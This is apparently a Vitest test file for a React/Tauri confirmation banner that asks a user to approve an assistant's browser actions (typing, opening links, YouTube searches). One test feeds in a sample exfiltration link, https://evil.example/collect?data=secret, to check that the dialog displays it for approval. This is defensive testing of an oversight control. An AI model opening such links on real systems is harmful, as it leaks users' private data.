/**
 * BrowserConfirmBanner — stream parse + confirm UX.
 */
import { describe, expect, it, vi, beforeEach } from "vitest";
import { render, screen, fireEvent, waitFor, act } from "@testing-library/react";
import {
  BrowserConfirmBanner,
  parsePendingChunk,
} from "../components/BrowserConfirmBanner";

const handlers = new Map<string, Set<(e: { payload: unknown }) => void>>();

vi.mock("@tauri-apps/api/event", () => ({
  listen: vi.fn(async (event: string, cb: (e: { payload: unknown }) => void) => {
    const set = handlers.get(event) ?? new Set();
    set.add(cb);
    handlers.set(event, set);
    return () => {
      set.delete(cb);
    };
  }),
}));

vi.mock("@tauri-apps/api/core", () => ({
  invoke: vi.fn(async () => undefined),
}));

import { invoke } from "@tauri-apps/api/core";

function emitPending(
  pendingId = "p-1",
  summary = 'Type "hello" into the focused window',
  actionKind = "browser_type",
  detail?: string,
) {
  const payload = {
    event: "sidecar-message",
    message: {
      type: "stream",
      id: "voice-1",
      chunk: JSON.stringify({
        browser_confirm_pending: true,
        pending_id: pendingId,
        summary,
        action_kind: actionKind,
        detail,
      }),
      finished: false,
    },
  };
  for (const cb of handlers.get("app-event") ?? []) {
    cb({ payload });
  }
}

describe("parsePendingChunk", () => {
  it("parses confirm streams", () => {
    const p = parsePendingChunk(
      JSON.stringify({
        browser_confirm_pending: true,
        pending_id: "abc",
        summary: "Type hi",
        action_kind: "browser_type",
      })
    );
    expect(p?.pendingId).toBe("abc");
    expect(p?.summary).toBe("Type hi");
  });

  it("ignores unrelated chunks", () => {
    expect(parsePendingChunk('{"voice_state":"idle"}')).toBeNull();
    expect(parsePendingChunk("not-json")).toBeNull();
  });
});

describe("BrowserConfirmBanner", () => {
  beforeEach(() => {
    handlers.clear();
    vi.mocked(invoke).mockReset();
  });

  it("calls onPendingChange and shows Confirm when a stream arrives", async () => {
    const onPendingChange = vi.fn();
    render(
      <BrowserConfirmBanner visible onPendingChange={onPendingChange} />
    );
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending();
    });
    expect(onPendingChange).toHaveBeenCalledWith(
      expect.objectContaining({ pendingId: "p-1" })
    );
    expect(await screen.findByRole("alertdialog")).toBeInTheDocument();
    expect(screen.getByText(/Type "hello"/i)).toBeInTheDocument();
  });

  it("stays silent while visible=false but still notifies parent", async () => {
    const onPendingChange = vi.fn();
    render(
      <BrowserConfirmBanner visible={false} onPendingChange={onPendingChange} />
    );
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending();
    });
    expect(onPendingChange).toHaveBeenCalled();
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
  });

  it("labels screen-context links and explains why", async () => {
    render(<BrowserConfirmBanner visible />);
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending(
        "p-2",
        "Open a link to evil.example",
        "open_url",
        "https://evil.example/collect?data=secret",
      );
    });
    expect(
      await screen.findByRole("alertdialog", { name: "Open this link?" })
    ).toBeInTheDocument();
    expect(screen.getByText("Open a link to evil.example")).toBeInTheDocument();
    expect(screen.getByText(/after reading your screen/i)).toBeInTheDocument();
    expect(
      screen.getByText("https://evil.example/collect?data=secret")
    ).toBeInTheDocument();
  });

  it("labels screen-context searches", async () => {
    render(<BrowserConfirmBanner visible />);
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending("p-3", "Search YouTube for “x”", "youtube_search", "x full");
    });
    expect(
      await screen.findByRole("alertdialog", { name: "Search YouTube?" })
    ).toBeInTheDocument();
    expect(screen.getByText(/anything private/i)).toBeInTheDocument();
    expect(screen.getByText("x full")).toBeInTheDocument();
  });

  it("keeps the generic title and no screen hint for browser actions", async () => {
    render(<BrowserConfirmBanner visible />);
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending();
    });
    expect(
      await screen.findByRole("alertdialog", { name: "Confirm browser action" })
    ).toBeInTheDocument();
    expect(screen.queryByText(/after reading your screen/i)).not.toBeInTheDocument();
  });

  it("keeps pending visible when confirm IPC fails", async () => {
    vi.mocked(invoke).mockRejectedValueOnce(new Error("sidecar down"));
    render(<BrowserConfirmBanner visible />);
    await waitFor(() => expect(handlers.has("app-event")).toBe(true));
    await act(async () => {
      emitPending();
    });
    fireEvent.click(await screen.findByRole("button", { name: "Confirm" }));
    await waitFor(() => {
      expect(screen.getByText(/sidecar down/i)).toBeInTheDocument();
    });
    expect(screen.getByRole("alertdialog")).toBeInTheDocument();
  });
});
